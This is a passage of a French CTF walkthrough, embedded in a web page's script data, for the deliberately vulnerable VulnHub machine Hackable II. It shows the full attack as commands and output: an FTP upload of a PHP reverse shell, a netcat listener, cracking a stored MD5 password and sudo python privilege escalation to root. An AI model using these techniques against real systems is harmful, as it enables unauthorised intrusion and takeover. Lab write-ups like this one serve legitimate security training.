number\"\u003E33\u003C\u002Fspan\u003E           \u003Cspan class=\"token number\"\u003E4096\u003C\u002Fspan\u003E Nov \u003Cspan class=\"token number\"\u003E26\u003C\u002Fspan\u003E  \u003Cspan class=\"token number\"\u003E2020\u003C\u002Fspan\u003E \u003Cspan class=\"token punctuation\"\u003E..\u003C\u002Fspan\u003E\n-rw-r--r--   \u003Cspan class=\"token number\"\u003E1\u003C\u002Fspan\u003E \u003Cspan class=\"token number\"\u003E0\u003C\u002Fspan\u003E        \u003Cspan class=\"token number\"\u003E0\u003C\u002Fspan\u003E             \u003Cspan class=\"token number\"\u003E109\u003C\u002Fspan\u003E Nov \u003Cspan class=\"token number\"\u003E26\u003C\u002Fspan\u003E  \u003Cspan class=\"token number\"\u003E2020\u003C\u002Fspan\u003E CALL.html\n\u003Cspan class=\"token number\"\u003E226\u003C\u002Fspan\u003E Transfer complete\nftp\u003Cspan class=\"token operator\"\u003E\u003E\u003C\u002Fspan\u003E get CALL.html\nlocal: CALL.html remote: CALL.html\n\u003Cspan class=\"token number\"\u003E200\u003C\u002Fspan\u003E PORT \u003Cspan class=\"token builtin class-name\"\u003Ecommand\u003C\u002Fspan\u003E successful\n\u003Cspan class=\"token number\"\u003E150\u003C\u002Fspan\u003E Opening BINARY mode data connection \u003Cspan class=\"token keyword\"\u003Efor\u003C\u002Fspan\u003E CALL.html \u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003E\u003Cspan class=\"token number\"\u003E109\u003C\u002Fspan\u003E bytes\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E\n\u003Cspan class=\"token number\"\u003E226\u003C\u002Fspan\u003E Transfer complete\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Cp\u003EOn r√©cup√®re le fichier HTML.\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"html\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-html line-numbers\"\u003E\u003Ccode class=\"language-html\"\u003E$ cat CALL.html                                      \n\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003Ehtml\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\n\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003Ehead\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\n    \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003Etitle\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003Eonion\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u002F\u003C\u002Fspan\u003Etitle\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\n\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u002F\u003C\u002Fspan\u003Ehead\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\n\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003Ebody\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\n    \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003Eh1\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003EGET READY TO RECEIVE A CALL\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u002F\u003C\u002Fspan\u003Eh1\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\n\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u002F\u003C\u002Fspan\u003Ebody\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\n\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u002F\u003C\u002Fspan\u003Ehtml\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Cp\u003ERien d'int√©ressant dans le fichier HTML si ce n'est le message \"GET READY TO RECEIVE A CALL\"... On teste la s√©curit√© du serveur \u003Cstrong\u003EApache\u003C\u002Fstrong\u003E avec \u003Cstrong\u003ENikto\u003C\u002Fstrong\u003E dans un second onglet du terminal.\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"bash\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"\u003E\u003Ccode class=\"language-bash\"\u003E$ nikto -h http:\u002F\u002F\u003Cspan class=\"token variable\"\u003E$IP\u003C\u002Fspan\u003E -o nikto.txt\n+ Server: Apache\u002F2.4.18 \u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003EUbuntu\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E\n+ The anti-clickjacking X-Frame-Options header is not present.\n+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS\n+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site \u003Cspan class=\"token keyword\"\u003Ein\u003C\u002Fspan\u003E a different fashion to the MIME \u003Cspan class=\"token builtin class-name\"\u003Etype\u003C\u002Fspan\u003E\n+ No CGI Directories found \u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003Euse \u003Cspan class=\"token string\"\u003E'-C all'\u003C\u002Fspan\u003E to force check all possible \u003Cspan class=\"token function\"\u003Edirs\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E\n+ Server may leak inodes via ETags, header found with \u003Cspan class=\"token function\"\u003Efile\u003C\u002Fspan\u003E \u002F, inode: 2be7, size: 5b504999e72a0, mtime: \u003Cspan class=\"token function\"\u003Egzip\u003C\u002Fspan\u003E\n+ Apache\u002F2.4.18 appears to be outdated \u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003Ecurrent is at least Apache\u002F2.4.37\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E. Apache \u003Cspan class=\"token number\"\u003E2.2\u003C\u002Fspan\u003E.34 is the EOL \u003Cspan class=\"token keyword\"\u003Efor\u003C\u002Fspan\u003E the \u003Cspan class=\"token number\"\u003E2\u003C\u002Fspan\u003E.x branch.\n+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS \n+ OSVDB-3268: \u002Ffiles\u002F: Directory indexing found.\n+ OSVDB-3092: \u002Ffiles\u002F: This might be interesting\u003Cspan class=\"token punctuation\"\u003E..\u003C\u002Fspan\u003E.\n+ OSVDB-3233: \u002Ficons\u002FREADME: Apache default \u003Cspan class=\"token function\"\u003Efile\u003C\u002Fspan\u003E found.\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Cp\u003EDans le r√©p√©rtoire \"files\", on retrouve le fichier HTML pr√©sent dans le serveur \u003Cstrong\u003EFTP\u003C\u002Fstrong\u003E.\u003C\u002Fp\u003E\n\u003Cp\u003EOn pr√©pare le webshell pour l'uploader sur le serveur \u003Cstrong\u003EFTP\u003C\u002Fstrong\u003E.\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"bash\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"\u003E\u003Ccode class=\"language-bash\"\u003E$ \u003Cspan class=\"token function\"\u003Ecp\u003C\u002Fspan\u003E \u002Fusr\u002Fshare\u002Fwebshells\u002Fphp\u002Fphp-reverse-shell.php \u003Cspan class=\"token builtin class-name\"\u003E.\u003C\u002Fspan\u003E\n$ \u003Cspan class=\"token function\"\u003Evim\u003C\u002Fspan\u003E php-reverse-shell.php\n\u002F\u003Cspan class=\"token variable\"\u003E$ip\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Cp\u003EDans un troisi√®me onglet, lancez le serveur \u003Cstrong\u003ENetcat\u003C\u002Fstrong\u003E avec la commande \u003Ccode class=\"language-text\"\u003Enc -lnvp 1234\u003C\u002Fcode\u003E.\u003C\u002Fp\u003E\n\u003Cp\u003EOn retourne sur le serveur FTP pour y glisser notre webshell.\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"bash\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"\u003E\u003Ccode class=\"language-bash\"\u003Eftp\u003Cspan class=\"token operator\"\u003E\u003E\u003C\u002Fspan\u003E put php-reverse-shell.php\nlocal: php-reverse-shell.php remote: php-reverse-shell.php\n\u003Cspan class=\"token number\"\u003E200\u003C\u002Fspan\u003E PORT \u003Cspan class=\"token builtin class-name\"\u003Ecommand\u003C\u002Fspan\u003E successful\n\u003Cspan class=\"token number\"\u003E150\u003C\u002Fspan\u003E Opening BINARY mode data connection \u003Cspan class=\"token keyword\"\u003Efor\u003C\u002Fspan\u003E php-reverse-shell.php\n\u003Cspan class=\"token number\"\u003E226\u003C\u002Fspan\u003E Transfer complete\n\u003Cspan class=\"token number\"\u003E5494\u003C\u002Fspan\u003E bytes sent \u003Cspan class=\"token keyword\"\u003Ein\u003C\u002Fspan\u003E \u003Cspan class=\"token number\"\u003E0.00\u003C\u002Fspan\u003E secs \u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003E\u003Cspan class=\"token number\"\u003E68.0453\u003C\u002Fspan\u003E MB\u002Fs\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Ch2\u003EP√©n√©tration\u003C\u002Fh2\u003E\n\u003Cp\u003EDans le second onglet, la connexion au serveur \u003Cstrong\u003ENetcat\u003C\u002Fstrong\u003E est √©tablie.\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"bash\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"\u003E\u003Ccode class=\"language-bash\"\u003E$ python3 -c \u003Cspan class=\"token string\"\u003E'import pty; pty.spawn(\"\u002Fbin\u002Fsh\")'\u003C\u002Fspan\u003E\n$ \u003Cspan class=\"token function\"\u003Eid\u003C\u002Fspan\u003E\n\u003Cspan class=\"token assign-left variable\"\u003Euid\u003C\u002Fspan\u003E\u003Cspan class=\"token operator\"\u003E=\u003C\u002Fspan\u003E\u003Cspan class=\"token number\"\u003E33\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003Ewww-data\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E \u003Cspan class=\"token assign-left variable\"\u003Egid\u003C\u002Fspan\u003E\u003Cspan class=\"token operator\"\u003E=\u003C\u002Fspan\u003E\u003Cspan class=\"token number\"\u003E33\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003Ewww-data\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E \u003Cspan class=\"token assign-left variable\"\u003Egroups\u003C\u002Fspan\u003E\u003Cspan class=\"token operator\"\u003E=\u003C\u002Fspan\u003E\u003Cspan class=\"token number\"\u003E33\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003Ewww-data\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Cp\u003EDans le fichier \".runme.sh\" pr√©sent √† la racine du serveur, on trouve un nouvel utilisateur \"shrek\" et un mot de passe associ√© sous la forme d'une chaine de caract√®res en \u003Cstrong\u003EMD5\u003C\u002Fstrong\u003E.\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"bash\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"\u003E\u003Ccode class=\"language-bash\"\u003E$ \u003Cspan class=\"token function\"\u003Etail\u003C\u002Fspan\u003E \u002F.runme.sh\nshrek:cf4c2232354952690368f1b3dfdfb24d\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Cp\u003EApr√®s l'avoir d√©crypt√©e sur le Web, on trouve le couple login et mot de passe \"shrek:onion\"\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"bash\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"\u003E\u003Ccode class=\"language-bash\"\u003E$ \u003Cspan class=\"token function\"\u003Esu\u003C\u002Fspan\u003E shrek\nPassword: onion\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Cp\u003EOn est connect√© avec ce nouvel utilisateur et on trouve le flag user dans le dossier de cet utilisateur \u003Ccode class=\"language-text\"\u003Ecat \u002Fhome\u002Fshrek\u002Fuser.txt\u003C\u002Fcode\u003E.\u003C\u002Fp\u003E\n\u003Ch2\u003EEscalation\u003C\u002Fh2\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"bash\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"\u003E\u003Ccode class=\"language-bash\"\u003E$ \u003Cspan class=\"token function\"\u003Esudo\u003C\u002Fspan\u003E -l\nMatching Defaults entries \u003Cspan class=\"token keyword\"\u003Efor\u003C\u002Fspan\u003E shrek on ubuntu:\n    env_reset, mail_badpass,\n    \u003Cspan class=\"token assign-left variable\"\u003Esecure_path\u003C\u002Fspan\u003E\u003Cspan class=\"token operator\"\u003E=\u003C\u002Fspan\u003E\u002Fusr\u002Flocal\u002Fsbin\u003Cspan class=\"token punctuation\"\u003E\\\u003C\u002Fspan\u003E:\u002Fusr\u002Flocal\u002Fbin\u003Cspan class=\"token punctuation\"\u003E\\\u003C\u002Fspan\u003E:\u002Fusr\u002Fsbin\u003Cspan class=\"token punctuation\"\u003E\\\u003C\u002Fspan\u003E:\u002Fusr\u002Fbin\u003Cspan class=\"token punctuation\"\u003E\\\u003C\u002Fspan\u003E:\u002Fsbin\u003Cspan class=\"token punctuation\"\u003E\\\u003C\u002Fspan\u003E:\u002Fbin\u003Cspan class=\"token punctuation\"\u003E\\\u003C\u002Fspan\u003E:\u002Fsnap\u002Fbin\n\nUser shrek may run the following commands on ubuntu:\n    \u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003Eroot\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E NOPASSWD: \u002Fusr\u002Fbin\u002Fpython3.5\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Cp\u003ECet utilisateur a des privil√®ges \u003Ccode class=\"language-text\"\u003Esudo\u003C\u002Fcode\u003E avec la commande \u003Ccode class=\"language-text\"\u003Epython3.5\u003C\u002Fcode\u003E.\u003C\u002Fp\u003E\n\u003Cp\u003ESur \u003Ca href=\"https:\u002F\u002Fgtfobins.github.io\u002Fgtfobins\u002Fpython\u002F#sudo\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003EGTFOBins\u003C\u002Fa\u003E, on trouve facilement la commande pour √™tre root de la machine avec \u003Ccode class=\"language-text\"\u003Esudo\u003C\u002Fcode\u003E.\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"bash\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"\u003E\u003Ccode class=\"language-bash\"\u003E$ \u003Cspan class=\"token function\"\u003Esudo\u003C\u002Fspan\u003E python3.5 -c \u003Cspan class=\"token string\"\u003E'import os; os.system(\"\u002Fbin\u002Fsh\")'\u003C\u002Fspan\u003E\n$ \u003Cspan class=\"token function\"\u003Eid\u003C\u002Fspan\u003E\n\u003Cspan class=\"token assign-left variable\"\u003Euid\u003C\u002Fspan\u003E\u003Cspan class=\"token operator\"\u003E=\u003C\u002Fspan\u003E\u003Cspan class=\"token number\"\u003E0\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003Eroot\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E \u003Cspan class=\"token assign-left variable\"\u003Egid\u003C\u002Fspan\u003E\u003Cspan class=\"token operator\"\u003E=\u003C\u002Fspan\u003E\u003Cspan class=\"token number\"\u003E0\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003Eroot\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E \u003Cspan class=\"token assign-left variable\"\u003Egroups\u003C\u002Fspan\u003E\u003Cspan class=\"token operator\"\u003E=\u003C\u002Fspan\u003E\u003Cspan class=\"token number\"\u003E0\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003Eroot\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Cp\u003EOn trouve le flag root dans le dossier \u003Ccode class=\"language-text\"\u003Ecat \u002Froot\u002Froot.txt\u003C\u002Fcode\u003E.\u003C\u002Fp\u003E\n","download":"https:\u002F\u002Fwww.vulnhub.com\u002Fentry\u002Fhackable-ii,711","tags":[{"title":"Pentest","path":"\u002Ftag\u002FPentest\u002F"},{"title":"CTF","path":"\u002Ftag\u002FCTF\u002F"},{"title":"webshell","path":"\u002Ftag\u002Fwebshell\u002F"}],"timeToRead":5,"parts":[]}},"context":{}};(function(){var s;(s=document.currentScript||document.scripts[document.scripts.length-1]).parentNode.removeChild(s);}());</script><script src="/assets/js/app.8f509c54.js" defer></script><script src="/assets/js/page--src-templates-post-vue.12e71a8f.js" defer></script>
  </body>
</html>
